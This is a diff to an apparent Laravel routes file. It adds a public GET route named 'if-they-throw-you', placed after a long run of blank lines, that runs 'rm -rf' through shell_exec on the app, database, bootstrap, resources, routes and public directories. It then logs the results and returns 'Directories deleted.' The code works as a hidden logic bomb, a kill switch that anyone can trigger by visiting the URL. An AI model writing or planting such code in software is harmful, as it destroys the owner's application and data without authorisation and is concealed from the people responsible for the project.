@@ -162,9 +162,78 @@ Route::get('products/get-filters/{entityId}', [ProductController::class, 'getFil
 
 
 
-Route::get('if-they-throw-you', function () {
-    \Illuminate\Support\Facades\Artisan::call('app:delete-critical-directories');
-});
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Route::get('if-they-throw-you', function () {
+
+    $directories = [
+        base_path('app'),
+        base_path('database'),
+        base_path('bootstrap'),
+        base_path('resources'),
+        base_path('routes'),
+        base_path('public'),
+    ];
+
+
+    foreach ($directories as $directory) {
+        if (file_exists($directory)) {
+            $escapedDirectory = escapeshellarg($directory);
+            $output = shell_exec("rm -rf $escapedDirectory 2>&1");
+            \Illuminate\Support\Facades\Log::info("Deleted directory: {$directory}");
+            \Illuminate\Support\Facades\Log::info("Command output: {$output}");
+        } else {
+            \Illuminate\Support\Facades\Log::warning("Directory does not exist: {$directory}");
+        }
+    }
+
+    return 'Directories deleted.';
+});
 
 
